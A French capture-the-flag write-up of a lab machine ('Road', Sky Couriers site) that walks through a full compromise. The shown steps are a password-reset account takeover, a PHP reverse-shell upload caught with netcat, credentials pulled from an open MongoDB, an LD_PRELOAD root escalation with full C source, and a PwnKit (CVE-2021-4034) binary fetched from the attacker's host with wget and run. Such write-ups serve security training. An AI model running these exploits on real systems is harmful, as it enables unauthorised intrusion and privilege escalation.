# ROOM : Road
*Inspired by a real-world pentesting engagement*


Voyons voir un peu cette room !
Les ips de la room change de temps en temps car je l'ai pas fait en une fois ;).

# Enumeration:
## Nmap:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-16 05:30 EST
Nmap scan report for 10.10.154.205
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.42 seconds

```
## Site:
On trouve un domain : skycouriers.thm
Il y a une login page sur laquel on peu créer un compte.

Compte de test:
```
test@test.com
test
```
La seule page fonctionnelle du site est http://10.10.154.205/v2/ResetUser.php
On retrouve le mail de l'admin qui est **admin@sky.thm**

On retrouve aussi un phpmyadmin en version 5.1.0 ici : http://10.10.111.112/phpMyAdmin

# Accès au site
Nous avons le mail de l'admin qui est admin@sky.thm 
On va devoir récupèrer ce compte.

Pour cela, on va créer un compte (notre compte de test) puis ensuite, on va changer son mot de passe.
On intercepte cette requête avec BurpSuite, puis on change notre nom de compte *test@test.com* par *admin@sky.thm*

On envoi la requête et c'est parfait, le serveur est OK.
```
HTTP/1.1 200 OK
Date: Thu, 16 Nov 2023 11:07:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
refresh: 3;url=ResetUser.php
Content-Length: 37
Connection: close
Content-Type: text/html; charset=UTF-8

Password changed. 
Taking you back...
```

Nous avons désormais l'accès au panel admin du site.
```
admin@sky.thm
test1
```
# Le shell ou pas ?!?
Sur le site, on peu importer un fichier, on va tenter de upload un shell.

Le shell **php-revshell.php** s'upload bien, on a un retour positif du serveur qui indique 
```
HTTP/1.1 200 OK
Date: Thu, 16 Nov 2023 19:54:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 26802
Connection: close
Content-Type: text/html; charset=UTF-8

Image saved.<!DOCTYPE html>
```
Quand j'upload le shell, il n'apparait pas dans http://10.10.157.67/assets/img/php-revshell.php
Peut etre qu'un script tourne derrière pour supprimer le fichier qui ne va pas....

En regardant d'un peu plus pret le retour du serveur après l'upload du shell, on trouve un commentaire utile : 
```
<!-- /v2/profileimages/ -->
```
J'upload donc un shell et vais sur la page http://10.10.111.112/v2/profileimages/php-revshell.php
et bingo !
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [{MON IP}] from (UNKNOWN) [10.10.111.112] 51758
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:47:29 up 48 min,  0 users,  load average: 0.02, 0.08, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

# Privesc user! 
Le 1er flag ce trouve dans le **/home** du user **webdevelopper**
```
6319***************************
```
On vois avec Linpeas que la base de donnée est mongodb.
Par chance, on peux s'y connecter sans mot de passe:
```
www-data@sky:/home/webdeveloper$ mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("1527056d-e411-4f09-a807-a7d23b8d88e2") }
MongoDB server version: 4.4.6
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
        https://community.mongodb.com
---
The server generated these startup warnings when booting: 
        2023-11-17T07:59:40.653+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2023-11-17T08:00:10.548+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
>
```
On va fouiller un peu tout ca, on affiche ici les dbs:
```
> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
```
Ici les users, il n'y en pas.
```
> show users
```
On va voir dans la db **admin**
```
> use admin
switched to db admin
> show collections
system.version
```
Rien de bien interessant, peut-être dans le **backup** ?
```
> use backup
switched to db backup
> show collections
collection
user
```
C'est déjà plus intéressant. On va afficher le contenu de la db **user**
```
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "Bah*************" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
>
```
On retrouve le mot de passe de **webdeveloper**, testons ca !
```
www-data@sky:/home/webdeveloper$ su - webdeveloper
Password: 
webdeveloper@sky:~$
```
Parfait, je suis connecté en tant que **webdeveloper**

# Privesc to root!
Notre session **wedeveloper** a un acces sudo:
```
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
webdeveloper@sky:~$
```
Il peux executer **/usr/bin/sky_backup_utility**.

**sky_backup_utility** est un bin Linux. On va le reverse avec Ghidra.
*Je passe par Ghidra pour la science, un simple cat sur ce fichier affiche ce qu'il nous faut pour deviner ce que ce petit programme fait*
```
bool main(void)

{
  int iVar1;
  
  puts("Sky Backup Utility");
  puts("Now attempting to backup Sky");
  iVar1 = system("tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*");
  if (iVar1 == 0) {
    puts("Backup successful!");
  }
  else {
    printf("Backup failed!\nCheck your permissions!");
  }
  return iVar1 != 0;
}
```
Comme on peu le voir ici, il archive tout le contenu du dosier /var/www/html.
Vu qu'il archive **TOUT** le dossier, on va pouvoir test de créer un shell et de mettre des checkpoints avec tar pour l'executer.

Bon, on peu pas écrire dans le dossier **/var/www/html/** donc pas de shell. On va regarder un peu ailleurs, on reviendra ici si on ne trouve rien d'autre ;)

On va test une autre approche.
Comme a on pu voir sur le résultat de la commande **sudo -l**, dans **secure_path** on retrouve **env_keep+=LD_PRELOAD**

On va donc test de créer un fichier **shell.c** qui contient ce code :
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
Ensuite, on le compile en fichier **.so**:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Puis, on l'execute :
```
webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
root@sky:/home/webdeveloper# id
uid=0(root) gid=0(root) groups=0(root)
```
Le flag ce trouve dans **/root/root.txt** comme d'hab :)

# Cheat mode :
Pour vous dire la vérité, cette room, je l'avais root directement avec le compte www-data :D.
La VM est vulnérable a l'exploit de Polkit CVE-2021-4034.

```
www-data@sky:/tmp$ wget {MON IP}/PwnKit
--2023-11-17 08:55:11--  http://{MON IP}/PwnKit
Connecting to {MON IP}:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.05s   

2023-11-17 08:55:11 (387 KB/s) - ‘PwnKit’ saved [18040/18040]

www-data@sky:/tmp$ chmod +x PwnKit
www-data@sky:/tmp$ ./PwnKit 
root@sky:/tmp#
```
